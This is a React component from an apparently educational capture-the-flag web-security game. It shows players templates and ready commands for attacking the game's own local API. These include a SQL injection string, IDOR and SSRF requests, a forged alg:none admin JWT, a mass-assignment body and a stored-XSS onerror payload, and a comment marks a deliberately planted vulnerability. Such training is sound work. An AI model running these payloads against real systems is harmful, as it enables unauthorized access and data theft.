import { useCallback, useEffect, useMemo, useState, type FormEvent } from 'react';
import { api, errorMessage, SCORE_CHANGED_EVENT, type Objective, type Post } from '../api';
import { useAuth } from '../auth';
import { formatCountdown, useNow, usePolling } from '../utils';
import { loadIntoTerminal } from './Terminal';
import { PostCard } from './PostCard';
import { wrongFlagHint } from './hintEngine';
import { pick, useLang, type Lang } from '../i18n';
import { useMode } from '../mode';
import { useConfirm } from './Confirm';
import { objectiveTitle, objectiveDescription, objectiveCategory } from '../objectiveText';
import { TypingText } from './TypingText';

const API = 'http://localhost:8080';

/** Tryb deweloperski: ?dev=1 w URL albo localStorage['trollnet.dev']='1'. Odsłania gotowe komendy. */
function isDevMode(): boolean {
  try {
    if (new URLSearchParams(window.location.search).get('dev') === '1') return true;
    return localStorage.getItem('trollnet.dev') === '1';
  } catch {
    return false;
  }
}

interface ExplainPart {
  part: string;
  meaning: string;
}

/**
 * Wskazówka przechwycenia dla jednego wektora podatności. Gracz dostaje `template` z lukami
 * (<PLACEHOLDER>) do uzupełnienia i opcjonalne `explain`. Pełny, gotowy do uruchomienia `ready`
 * jest odsłaniany tylko w trybie dev / w DevTools — nie prowadzi gracza za rękę.
 * `isConsole` oznacza snippet do konsoli przeglądarki (DevTools), nie do terminala curl.
 */
interface CaptureGuide {
  how: string;
  template?: string;
  ready?: string;
  isConsole?: boolean;
  /** Raw endpoint a player can open directly in the browser (GET, no auth). */
  browserUrl?: string;
  /** Stored-XSS payload to publish as a post (captures the flag when the feed renders it). */
  payload?: string;
  /** Multi-step capture: an ordered list of loadable terminal commands, each with a short note. */
  steps?: { command: string; note?: string }[];
  explain?: ExplainPart[];
}

function captureGuide(o: Objective, lang: Lang): CaptureGuide {
  const post = o.targetPostId ?? 0;
  const L = (pl: string, en: string) => pick(lang, pl, en);
  switch (o.vector) {
    case 'DataLeak':
      return {
        how: L(
          'Ten endpoint zwraca sekret KAŻDEGO zadania każdemu, kto zapyta — i jest anonimowy. Odczytaj flagę wprost z API zadań: curl-em w terminalu albo wpisując ścieżkę w przeglądarce. W odpowiedzi (tablica zadań) znajdź to z id #' + o.id + ' i jego pole "flag".',
          'This endpoint returns EVERY objective\'s secret to anyone who asks — and it is anonymous. Read the flag straight from the objectives API: with curl in the terminal, or by opening the path in your browser. In the response (an array of objectives) find the one with id #' + o.id + ' and its "flag" field.',
        ),
        template: `curl ${API}/api/objectives`,
        ready: `curl ${API}/api/objectives | jq '.[].flag'`,
        browserUrl: `${API}/api/objectives`,
        explain: [
          { part: `${API}/api/objectives`, meaning: L('Publiczna lista zadań — każdy wpis ma pole "flag" (dla tego wektora NIE jest ukryte).', 'The public objectives list — every entry has a "flag" field (not hidden for this vector).') },
          { part: "jq '.[].flag'", meaning: L('Opcjonalnie: wypisuje same flagi ze wszystkich zadań (większość to null, jedna to Twoja).', 'Optional: prints just the flags of all objectives (most are null, one is yours).') },
        ],
      };
    case 'Sqli':
      return {
        how: L('Wstrzyknij do wyszukiwarki tak, by zrzuciła ukrytą kolumnę każdego posta; flaga jest w systemNote posta-celu.',
          "Inject into the search so it dumps every post's hidden column; the flag is in the target post's systemNote."),
        template: `curl -G --data-urlencode "query=<SQLI_PAYLOAD>" ${API}/api/posts/search`,
        ready: `curl -G --data-urlencode "query=' OR 1=1 --" ${API}/api/posts/search`,
        explain: [
          { part: '<SQLI_PAYLOAD>', meaning: L("Ładunek zawsze prawdziwy, który ucina resztę zapytania, np.  ' OR 1=1 --", "An always-true payload that comments out the rest of the query, e.g.  ' OR 1=1 --") },
          { part: '--data-urlencode', meaning: L('Koduje ładunek, żeby spacje i znaki specjalne dotarły do serwera w całości.', 'URL-encodes the payload so spaces and special characters reach the server intact.') },
        ],
      };
    case 'Idor':
      return {
        how: L('Odczytaj prywatną notatkę posta po jego numerze — nie ma sprawdzenia właściciela.', "Read the post's private note by its number — there is no ownership check."),
        template: `curl ${API}/api/posts/<POST_ID>/note`,
        ready: `curl ${API}/api/posts/${post}/note`,
        explain: [{ part: '<POST_ID>', meaning: L(`Numer posta-celu z karty zadania (tu: #${post}).`, `The target post number from the task card (here: #${post}).`) }],
      };
    case 'MissingAuth':
      return {
        how: L('Nieuwierzytelniony odczyt wewnętrzny zwraca notatkę, którą publiczny feed ukrywa.', 'The unauthenticated internal read returns the note the public feed hides.'),
        template: `curl ${API}/internal/posts/<POST_ID>`,
        ready: `curl ${API}/internal/posts/${post}`,
        explain: [{ part: '<POST_ID>', meaning: L(`Numer posta-celu z karty zadania (tu: #${post}).`, `The target post number from the task card (here: #${post}).`) }],
      };
    case 'Ssrf':
      return {
        how: L('Skarbiec odpowiada tylko z wnętrza sieci. Niech fetch podglądu linku pobierze go za Ciebie.', 'The vault only answers from inside the network. Make the link-preview fetch it for you.'),
        template: `curl -X POST ${API}/api/link-preview -H "Content-Type: application/json" -d '{"url":"http://game-service:8080/internal/vault/<OBJECTIVE_ID>"}'`,
        ready: `curl -X POST ${API}/api/link-preview -H "Content-Type: application/json" -d '{"url":"http://game-service:8080/internal/vault/${o.id}"}'`,
        explain: [{ part: '<OBJECTIVE_ID>', meaning: L(`Numer objective'u z karty (tu: #${o.id}) — skarbiec jest kluczowany numerem objective'u.`, `The objective number from the card (here: #${o.id}) — the vault is keyed by objective number.`) }],
      };
    case 'MassAssign':
      return {
        how: L('Utwórz post, ale podrzuć uprzywilejowane pole — serwer odeśle sekret dekretu w odpowiedzi "systemNote".', 'Create a post but sneak in a privileged field — the server echoes the decree secret back in the response "systemNote".'),
        template: `curl -X POST ${API}/api/posts -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"content":"forged decree", <FORGE_PRIVILEGED_FIELD>}'`,
        ready: `curl -X POST ${API}/api/posts -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"content":"forged decree","isTrending":true}'`,
        explain: [
          { part: '<FORGE_PRIVILEGED_FIELD>', meaning: L('Dopisz pole JSON, którego zwykły użytkownik nie powinien kontrolować — takie, które czyni post „trending".', 'Add a JSON field a normal user should not control — one that makes a post "trending".') },
          { part: '$TOKEN', meaning: L('Twój token sesji; w terminalu podstawia się automatycznie.', 'Your session token; the terminal substitutes it automatically.') },
        ],
      };
    case 'AdminEndpoint': {
      if (o.tipId === '13') {
        // Forge an alg:none Admin JWT (the signature is never checked), then read the vault.
        // The token is fully static (role=Admin), so step 3 is pre-assembled and just works.
        const headerB64 = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0';
        const forgedToken = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiI5OTkiLCJuYW1lIjoiZm9yZ2VkLWFkbWluIiwicm9sZSI6IkFkbWluIn0.';
        return {
          how: L('Skarbiec jest tylko dla admina, ale podpis JWT nie jest sprawdzany — token  alg:none  z  role=Admin  jest przyjmowany. Zbuduj go i otwórz skarbiec. Uruchom komendy po kolei:',
            'The vault is admin-only, but the JWT signature is never checked — an  alg:none  token with  role=Admin  is accepted. Build it and open the vault. Run the commands in order:'),
          steps: [
            {
              command: `echo '{"alg":"none","typ":"JWT"}' | base64`,
              note: L('Tak koduje się nagłówek z alg:none (base64url) — to pierwsza część tokenu.', 'This is how the alg:none header is encoded (base64url) — the first part of the token.'),
            },
            {
              command: `echo '{"sub":"999","name":"forged-admin","role":"Admin"}' | base64`,
              note: L('Tak koduje się ładunek z role=Admin — druga część tokenu.', 'This is how the role=Admin payload is encoded — the second part of the token.'),
            },
            {
              command: `TOKEN=${forgedToken}`,
              note: L(`Gotowy token: nagłówek.ładunek. z kroków 1–2 (nagłówek = ${headerB64}). Kropka na końcu to pusty podpis — i tak nie jest sprawdzany.`,
                `The assembled token: header.payload. from steps 1–2 (header = ${headerB64}). The trailing dot is the empty signature — it is never checked anyway.`),
            },
            {
              command: `curl ${API}/api/objectives/${o.id}/flag -H "Authorization: Bearer $TOKEN"`,
              note: L('Zwraca flagę ze skarbca admina (używa $TOKEN z kroku 3).', 'Returns the flag from the admin vault (uses $TOKEN from step 3).'),
            },
          ],
        };
      }
      // #16: a leaky debug-config endpoint exposes the admin login + password. Read them, log in, open the vault.
      return {
        how: L('Debugowy endpoint konfiguracji wycieka login i hasło admina. Pobierz je, zaloguj się jako admin, a potem otwórz skarbiec zadania. Uruchom komendy po kolei:',
          'A leaky debug-config endpoint exposes the admin login and password. Fetch them, log in as admin, then open the objective vault. Run the commands in order:'),
        steps: [
          {
            command: `curl ${API}/api/auth/config`,
            note: L('Wycieka adminUsername i adminPassword (debug zostawiony włączony).', 'Leaks adminUsername and adminPassword (a debug endpoint left enabled).'),
          },
          {
            command: `curl -X POST ${API}/api/auth/login -H "Content-Type: application/json" -d '{"username":"admin","password":"admin1234"}' | jq -r .token`,
            note: L('Loguje się jako admin (dane z kroku 1) i wypisuje sam token.', 'Logs in as admin (creds from step 1) and prints just the token.'),
          },
          {
            command: `TOKEN=<wklej-token-z-kroku-2>`,
            note: L('Podmień placeholder na token z kroku 2 i uruchom, by zapisać go do $TOKEN.', 'Replace the placeholder with the token from step 2 and run it to store it in $TOKEN.'),
          },
          {
            command: `curl ${API}/api/objectives/${o.id}/flag -H "Authorization: Bearer $TOKEN"`,
            note: L('Zwraca flagę zadania (endpoint tylko dla admina — używa $TOKEN z kroku 3).', 'Returns the objective flag (admin-only endpoint — uses $TOKEN from step 3).'),
          },
        ],
      };
    }
    case 'Xss':
      return {
        how: L(
          'Flaga żyje w zmiennej JS, nigdy nie jest rysowana. Wstrzyknij TRWAŁY ładunek XSS do posta — gdy feed go wyrenderuje, handler odczyta ukryte powiadomienie i prześle flagę beaconem. To zalicza zadanie. Samo odczytanie flagi w konsoli NIE wystarczy.',
          'The flag lives in a JS variable, never rendered. Inject a STORED XSS payload into a post — when the feed renders it, the handler reads the hidden notice and beacons the flag. That captures the objective. Reading the flag in the console is NOT enough.',
        ),
        payload: `<img src=x onerror="window.__trollnetXss(${o.id})">`,
        explain: [
          { part: '<img src=x onerror=…>', meaning: L('Obrazek „x" się nie wczyta, więc przeglądarka odpala handler onerror — to właśnie wykonanie wstrzykniętego skryptu (XSS).', 'The "x" image fails to load, so the browser runs the onerror handler — that is the injected script executing (XSS).') },
          { part: `window.__trollnetXss(${o.id})`, meaning: L('Funkcja wstawiona przez stronę: pobiera ukryte powiadomienie i wysyła flagę beaconem na serwer. Możesz też napisać własny payload czytający window.__trollnetNotices.', 'A helper the page registered: it fetches the hidden notice and beacons the flag to the server. You can also write your own payload reading window.__trollnetNotices.') },
          { part: L('Opublikuj jako post', 'Post it'), meaning: L('Ładunek musi zostać ZAPISANY (stored XSS) i wyrenderowany w feedzie — wklej go jako nowy post w zakładce Feed i odśwież feed.', 'The payload must be STORED (stored XSS) and rendered in the feed — paste it as a new post in the Feed tab and refresh the feed.') },
        ],
      };
  }
}

function copyText(text: string) {
  try {
    void navigator.clipboard?.writeText(text);
  } catch {
    /* clipboard unavailable */
  }
}

/** Explains the curl flags actually present in a command template (educational mode only). */
function curlFlagExplanations(command: string, lang: Lang): ExplainPart[] {
  const L = (pl: string, en: string) => pick(lang, pl, en);
  if (!command.startsWith('curl')) return [];
  const out: ExplainPart[] = [
    { part: 'curl', meaning: L('Wysyła żądanie HTTP do API prosto z terminala.', 'Sends an HTTP request to the API straight from the terminal.') },
  ];
  const has = (re: RegExp) => re.test(command);
  if (has(/(^|\s)(-X|--request)(\s|$)/)) out.push({ part: '-X', meaning: L('Metoda HTTP, np. GET lub POST.', 'The HTTP method, e.g. GET or POST.') });
  if (has(/(^|\s)(-H|--header)(\s|$)/)) out.push({ part: '-H', meaning: L('Dodaje nagłówek — np. Authorization albo Content-Type.', 'Adds a header — e.g. Authorization or Content-Type.') });
  if (has(/--data-urlencode/)) out.push({ part: '--data-urlencode', meaning: L('Koduje wartość do URL (spacje, znaki specjalne) i wysyła ją.', 'URL-encodes the value (spaces, special characters) and sends it.') });
  else if (has(/(^|\s)(-d|--data)(\s|$)/)) out.push({ part: '-d', meaning: L('Treść (body) żądania — zwykle JSON.', 'The request body — usually JSON.') });
  if (has(/(^|\s)(-G|--get)(\s|$)/)) out.push({ part: '-G', meaning: L('Przenosi dane z -d do query w URL (żądanie GET).', 'Moves the -d data into the URL query (a GET request).') });
  if (has(/(^|\s)(-i|--include)(\s|$)/)) out.push({ part: '-i', meaning: L('Pokazuje też status i nagłówki odpowiedzi.', 'Also shows the response status and headers.') });
  if (has(/\|\s*jq\b/)) out.push({ part: '| jq', meaning: L('Przekazuje JSON do jq, które wybiera pola z odpowiedzi.', 'Pipes the JSON into jq, which picks fields from the response.') });
  return out;
}

export function ObjectivesView({ onOpenTips, onOpenTip }: { onOpenTips: () => void; onOpenTip: (tipId: string) => void }) {
  const { lang } = useLang();
  const L = (pl: string, en: string) => pick(lang, pl, en);
  const { state, isChallenge, setMode, mode } = useMode();
  const [objectives, setObjectives] = useState<Objective[]>([]);
  // Client-side view state: the one "focused" (pinned-to-top) objective and the ones the player skipped.
  const [focusedId, setFocusedId] = useState<number | null>(null);
  const [skippedIds, setSkippedIds] = useState<Set<number>>(() => new Set());
  const [loaded, setLoaded] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const now = useNow(1000);

  const refresh = useCallback(() => {
    api
      .objectives()
      .then((items) => {
        setObjectives(items);
        setError(null);
      })
      .catch((err) => setError(errorMessage(err)))
      .finally(() => setLoaded(true));
  }, []);

  usePolling(refresh, 15_000);

  // A capture (including an XSS beacon firing in the feed) dispatches SCORE_CHANGED — refresh immediately.
  useEffect(() => {
    window.addEventListener(SCORE_CHANGED_EVENT, refresh);
    return () => window.removeEventListener(SCORE_CHANGED_EVENT, refresh);
  }, [refresh]);

  // A skipped/failed objective is the one the server marks failed for this player (survives tab switches)
  // OR one just skipped locally (optimistic, before the next refresh).
  const isObjectiveSkipped = useCallback(
    (o: Objective) => !o.isCompleted && (o.attemptFailed === true || skippedIds.has(o.id)),
    [skippedIds],
  );

  // Switching mode starts a fresh view: drop focus and the optimistic skipped list, then refresh (the
  // server has reset this player's attempts, so attemptFailed clears too).
  useEffect(() => {
    setFocusedId(null);
    setSkippedIds(new Set());
    refresh();
  }, [mode, refresh]);

  // Drop focus once the focused objective is no longer an active, non-skipped card (captured/expired/skipped).
  useEffect(() => {
    if (focusedId != null && !objectives.some((o) => o.id === focusedId && !isObjectiveSkipped(o) && !o.isCompleted)) {
      setFocusedId(null);
    }
  }, [objectives, focusedId, isObjectiveSkipped]);

  // Order: focused first, then the other active objectives, then skipped (failed), then completed.
  const orderedObjectives = useMemo(() => {
    const active: Objective[] = [];
    const skipped: Objective[] = [];
    const completed: Objective[] = [];
    for (const o of objectives) {
      if (o.isCompleted) completed.push(o);
      else if (isObjectiveSkipped(o)) skipped.push(o);
      else active.push(o);
    }
    if (focusedId != null) {
      const i = active.findIndex((o) => o.id === focusedId);
      if (i > 0) active.unshift(active.splice(i, 1)[0]);
    }
    return [...active, ...skipped, ...completed];
  }, [objectives, focusedId, isObjectiveSkipped]);

  const markSkipped = useCallback((id: number) => {
    setSkippedIds((prev) => new Set(prev).add(id));
    setFocusedId((f) => (f === id ? null : f));
  }, []);

  const toggleFocus = useCallback((id: number) => {
    setFocusedId((f) => (f === id ? null : id));
  }, []);

  return (
    <div className="stack">
      <div className="intro">
        <h2>{L('Zadania', 'Objectives')}</h2>
        <p className="muted small">
          {L(
            'Nowe trendujące posty pojawiają się regularnie. Przechwyć flagę każdego zadania, zanim moderator sprawdzi post. Pierwszy troll z poprawną flagą dostaje punkty.',
            "New trending posts appear regularly. Capture each objective's flag before the moderator reviews the post. First troll to submit the right flag gets the points.",
          )}
        </p>
        <button className="link small" onClick={onOpenTips}>
          {L('Utknąłeś? Otwórz wskazówki treningowe', 'Stuck? Open the training tips')}
        </button>
        <p className="muted small">
          {isChallenge
            ? L(
                `Tryb Wyzwanie: pełne punkty, bez szablonów i wyjaśnień (zostają Wskazówki, API & DB oraz bot w terminalu). ${state?.fails ?? 0}/${state?.maxFails ?? 4} oblanych zadań kończy wyzwanie.`,
                `Challenge mode: full points, no templates or explanations (the Tips, API & DB and terminal bot remain). ${state?.fails ?? 0}/${state?.maxFails ?? 4} failed objectives end the challenge.`,
              )
            : L(
                `Tryb Edukacja: widoczne szablony i wyjaśnienia, punkty o połowę mniejsze. Oblane zadania (wygasłe/pominięte): ${state?.fails ?? 0}.`,
                `Educational mode: templates and explanations shown, points halved. Failed objectives (expired/skipped): ${state?.fails ?? 0}.`,
              )}
        </p>
      </div>

      {isChallenge && state?.challengeStatus === 'Ended' && (
        <div className="challenge-over">
          <h3>{L('Wyzwanie zakończone', 'Challenge over')}</h3>
          <p className="muted small">
            {L(
              `Oblałeś ${state.fails} zadań. Zapisany wynik: ${state.challengeScore} pkt. Wysyłanie flag jest zablokowane.`,
              `You failed ${state.fails} objectives. Saved score: ${state.challengeScore} pts. Flag submission is locked.`,
            )}
          </p>
          <button className="primary" onClick={() => void setMode('Challenge')}>
            {L('Zacznij nowe wyzwanie', 'Start a new challenge')}
          </button>{' '}
          <button className="link small" onClick={() => void setMode('Educational')}>
            {L('Wróć do Edukacji', 'Back to Educational')}
          </button>
        </div>
      )}

      {error && <p className="error">{error}</p>}
      {loaded && objectives.length === 0 && !error && (
        <p className="muted center">{L('Brak aktywnych zadań. Następne już niedługo...', 'No active objectives. The next one is coming soon...')}</p>
      )}

      <div className="list">
        {orderedObjectives.map((o) => (
          <ObjectiveCard
            key={o.id}
            objective={o}
            now={now}
            onChanged={refresh}
            onOpenTip={onOpenTip}
            focused={focusedId === o.id}
            skipped={isObjectiveSkipped(o)}
            onToggleFocus={() => toggleFocus(o.id)}
            onSkipped={() => markSkipped(o.id)}
          />
        ))}
      </div>
    </div>
  );
}

interface CardProps {
  objective: Objective;
  now: number;
  onChanged: () => void;
  onOpenTip: (tipId: string) => void;
  focused: boolean;
  skipped: boolean;
  onToggleFocus: () => void;
  onSkipped: () => void;
}

function ObjectiveCard({ objective: o, now, onChanged, onOpenTip, focused, skipped, onToggleFocus, onSkipped }: CardProps) {
  const { user } = useAuth();
  const { lang } = useLang();
  const L = (pl: string, en: string) => pick(lang, pl, en);
  const { isChallenge, state, skip, refresh: refreshMode } = useMode();
  const confirm = useConfirm();
  const challengeEnded = isChallenge && state?.challengeStatus === 'Ended';
  const effectivePoints = isChallenge ? o.points : Math.floor(o.points / 2);
  const isXss = o.vector === 'Xss';
  const isAdmin = o.vector === 'AdminEndpoint';
  const [flag, setFlag] = useState('');
  const [result, setResult] = useState<{ ok: boolean; text: string; hint?: string } | null>(null);
  const [busy, setBusy] = useState(false);
  const [target, setTarget] = useState<Post | null>(null);
  const [showTarget, setShowTarget] = useState(false);

  const remaining = new Date(o.expiresAt).getTime() - now;
  const expired = !o.isCompleted && remaining <= 0;
  const open = !o.isCompleted && !expired;
  const guide = captureGuide(o, lang);
  const devMode = isDevMode();

  // VULN-SPOT #02: for XSS objectives, load the flag into a JS-only global (the "hidden notice") that only
  // in-page script can read. It is never rendered; a stored XSS payload reads it (or the app-wide
  // window.__trollnetXss helper, registered in App, fetches it) and beacons the flag to capture the objective.
  useEffect(() => {
    if (o.vector !== 'Xss' || !open) return;
    api
      .objectiveNotice(o.id)
      .then((n) => {
        const w = window as unknown as { __trollnetNotices?: Record<number, string> };
        (w.__trollnetNotices ??= {})[o.targetPostId ?? o.id] = n.flag;
      })
      .catch(() => {
        /* notice unavailable */
      });
  }, [o.id, o.vector, o.targetPostId, open]);

  async function toggleTarget() {
    if (!showTarget && target === null && o.targetPostId !== null) {
      try {
        const detail = await api.post(o.targetPostId);
        setTarget({ ...detail, commentCount: detail.comments.length });
      } catch (err) {
        setResult({ ok: false, text: errorMessage(err) });
        return;
      }
    }
    setShowTarget((v) => !v);
  }

  async function submit(e: FormEvent) {
    e.preventDefault();
    if (!user) return;
    setBusy(true);
    try {
      const res = await api.submitFlag(o.id, flag.trim());
      setResult({ ok: res.correct, text: res.message, hint: res.correct ? undefined : wrongFlagHint(o, lang) });
      if (res.correct) {
        setFlag('');
        window.dispatchEvent(new Event(SCORE_CHANGED_EVENT));
        onChanged();
      }
    } catch (err) {
      setResult({ ok: false, text: errorMessage(err) });
      onChanged();
    } finally {
      setBusy(false);
    }
  }

  async function onSkip() {
    if (!open || busy) return;
    const ok = await confirm({
      title: L('Pominąć zadanie?', 'Skip this objective?'),
      message: isChallenge
        ? L('Liczy się jako oblane — 4 oblane kończą wyzwanie. Tego nie da się cofnąć.', 'It counts as a fail — 4 fails end the challenge. This cannot be undone.')
        : L('Zwiększy licznik oblanych zadań. Tego nie da się cofnąć.', 'It increases the failed-objectives counter. This cannot be undone.'),
      confirmLabel: L('Pomiń', 'Skip'),
      cancelLabel: L('Anuluj', 'Cancel'),
      danger: true,
    });
    if (!ok) return;
    setBusy(true);
    try {
      await skip(o.id);
      onSkipped();
      onChanged(); // pull the server's attemptFailed so the skip survives tab switches/reloads
    } catch (err) {
      setResult({ ok: false, text: errorMessage(err) });
    } finally {
      setBusy(false);
      refreshMode();
    }
  }

  // A skipped objective drops to a compact "failed, not completed" card at the bottom — no interactions.
  if (skipped) {
    return (
      <article className="objective skipped closed">
        <header className="objective-header">
          <h3>{objectiveTitle(o, lang)}</h3>
          <span className="muted small skipped-tag">{L('pominięte · oblane', 'skipped · failed')}</span>
        </header>
        <p className="muted small">
          {L('zadanie', 'objective')} #{o.id} · {objectiveCategory(o.category, lang)} · {L('nie wykonane', 'not completed')}
        </p>
      </article>
    );
  }

  return (
    <article className={`objective${open ? '' : ' closed'}${focused ? ' focused' : ''}`}>
      <header className="objective-header">
        <h3>{objectiveTitle(o, lang)}</h3>
        <span className="objective-header-right">
          {o.isCompleted ? (
            <span className="muted small">{L('przechwycone przez', 'captured by')} @{o.completedByUsername}</span>
          ) : expired ? (
            <span className="muted small">{L('sprawdzone przez moderatora', 'reviewed by moderator')}</span>
          ) : (
            <span className={remaining < 60_000 ? 'timer urgent' : 'timer'} aria-label={L('Pozostały czas', 'Time remaining')}>
              {formatCountdown(remaining)}
            </span>
          )}
          {open && (
            <button
              className={focused ? 'focus-pin active' : 'focus-pin'}
              onClick={onToggleFocus}
              aria-pressed={focused}
              title={focused ? L('Odepnij — przestań trzymać na górze', 'Unpin — stop keeping at the top') : L('Przypnij — trzymaj na górze', 'Pin — keep at the top')}
            >
              📌
            </button>
          )}
        </span>
      </header>

      <p className="muted small">
        {L('zadanie', 'objective')} #{o.id} · {objectiveCategory(o.category, lang)} · {L('trudność', 'difficulty')} {o.difficulty}/3 ·{' '}
        {effectivePoints} {L('pkt', 'pts')}
        {!isChallenge && <span title={L('W trybie Edukacja punkty są o połowę mniejsze', 'Educational mode halves points')}> ({L('edu ÷2', 'edu ÷2')})</span>}
        {o.targetPostId !== null && <> · {L('post-cel', 'target post')} #{o.targetPostId}</>}
      </p>
      <p>{objectiveDescription(o, lang)}</p>
      {isAdmin && (
        <p className="muted small admin-req">
          🔒 {L('Wymaga roli Admin — zwykły token da 403. Zdobądź uprawnienia admina (patrz „Jak przechwycić" / Wskazówka).', 'Requires the Admin role — a normal token gets 403. Gain admin privileges (see "How to capture" / the Tip).')}
        </p>
      )}

      {open && isChallenge && (
        <div className="capture-panel">
          <p className="muted small">
            {L(
              'Tryb Wyzwanie — bez szablonu i wyjaśnień. Skorzystaj z zakładek Wskazówki oraz API & DB i z terminala (bot podpowie kierunek).',
              'Challenge mode — no template or explanations. Use the Tips and API & DB tabs and the terminal (the bot nudges you in the right direction).',
            )}
          </p>
        </div>
      )}

      {open && !isChallenge && (
        <div className="capture-panel">
          <p className="muted small">
            <strong>{L('Jak przechwycić:', 'How to capture:')}</strong> {guide.how}
          </p>
          {guide.steps && guide.steps.map((s, i) => (
            <p className="capture-cmd capture-step" key={i}>
              <span className="step-num">{i + 1}.</span> <code>{s.command}</code>{' '}
              <button className="link small" onClick={() => loadIntoTerminal(s.command)}>
                {L('Załaduj do terminala', 'Load into terminal')}
              </button>
              {s.note && <span className="muted small step-note"> — {s.note}</span>}
            </p>
          ))}
          {guide.payload && (
            <>
              <p className="capture-cmd">
                <code className="payload">{guide.payload}</code>{' '}
                <button className="link small" onClick={() => copyText(guide.payload!)}>
                  {L('Kopiuj ładunek', 'Copy payload')}
                </button>
              </p>
              <p className="muted small">
                {L('Opublikuj to jako nowy post (zakładka Feed). Gdy feed się odświeży, ładunek wykona się i zaliczy zadanie.', 'Post this as a new post (Feed tab). When the feed refreshes, the payload runs and captures the objective.')}
              </p>
            </>
          )}
          {guide.template && (
            <p className="capture-cmd">
              <code>{guide.template}</code>{' '}
              {!guide.isConsole && (
                <button className="link small" onClick={() => loadIntoTerminal(guide.template!)}>
                  {L('Załaduj do terminala', 'Load into terminal')}
                </button>
              )}
              {guide.browserUrl && (
                <>
                  {' · '}
                  <a className="link small" href={guide.browserUrl} target="_blank" rel="noopener noreferrer">
                    {L('Otwórz w przeglądarce ↗', 'Open in browser ↗')}
                  </a>
                </>
              )}
            </p>
          )}
          {guide.isConsole && (
            <p className="muted small">{L('Otwórz DevTools (F12) → zakładka ', 'Open DevTools (F12) → ')}<strong>Console</strong>{L(' i wpisz powyższe.', ' tab and type the above.')}</p>
          )}
          {(() => {
            const parts = [...(guide.explain ?? []), ...curlFlagExplanations(guide.template ?? '', lang)];
            return parts.length > 0 ? (
              <details className="capture-explain">
                <summary className="link small">{L('Wyjaśnienie polecenia i flag', 'Explain the command & flags')}</summary>
                <ul className="muted small">
                  {parts.map((e) => (
                    <li key={e.part}>
                      <code>{e.part}</code> — {e.meaning}
                    </li>
                  ))}
                </ul>
              </details>
            ) : null;
          })()}
          {devMode && guide.ready && (
            <p className="capture-cmd">
              <span className="muted small">{L('[dev] gotowa komenda: ', '[dev] ready command: ')}</span>
              <code>{guide.ready}</code>{' '}
              {!guide.isConsole && (
                <button className="link small" onClick={() => loadIntoTerminal(guide.ready!)}>
                  {L('Uruchom w terminalu', 'Run in terminal')}
                </button>
              )}
            </p>
          )}
        </div>
      )}

      <div className="objective-actions">
        <button className="link small" onClick={() => onOpenTip(o.tipId)}>
          {L('Potrzebujesz podpowiedzi?', 'Need a hint?')} (#{o.tipId})
        </button>
        {o.targetPostId !== null && open && (
          <button className="link small" onClick={toggleTarget} aria-expanded={showTarget}>
            {showTarget
              ? L('Ukryj post-cel', 'Hide target post')
              : L(`Pokaż post-cel #${o.targetPostId}`, `Show target post #${o.targetPostId}`)}
          </button>
        )}
        {open && !challengeEnded && (
          <button className="link small danger" onClick={onSkip} disabled={busy}>
            {L('Pomiń (poddaj się)', 'Skip (give up)')}
          </button>
        )}
      </div>
      {showTarget && target && <PostCard post={target} initiallyExpanded />}

      {open && !challengeEnded && !isXss && (
        <form className="flag-form" onSubmit={submit}>
          <input
            placeholder="TROLL{...}"
            value={flag}
            maxLength={100}
            onChange={(e) => setFlag(e.target.value)}
            aria-label="Flag"
          />
          <button className="primary" type="submit" disabled={busy || !user || !flag.trim()}>
            {L('Wyślij flagę', 'Submit flag')}
          </button>
        </form>
      )}
      {open && !challengeEnded && isXss && (
        <p className="muted small">
          {L('To zadanie zalicza się samo, gdy Twój ładunek XSS wykona się w feedzie — nie wpisujesz tu flagi.', 'This objective captures itself when your XSS payload runs in the feed — you do not type a flag here.')}
        </p>
      )}
      {open && challengeEnded && (
        <p className="muted small">{L('Wyzwanie zakończone — wysyłanie flag zablokowane.', 'Challenge over — flag submission locked.')}</p>
      )}
      {result && <p className={result.ok ? 'success-text' : 'error'}>{result.text}</p>}
      {result && !result.ok && result.hint && (
        <p className="muted small bot-hint">
          <span aria-hidden="true">🤖</span> <TypingText key={result.hint} text={result.hint} />
        </p>
      )}
    </article>
  );
}
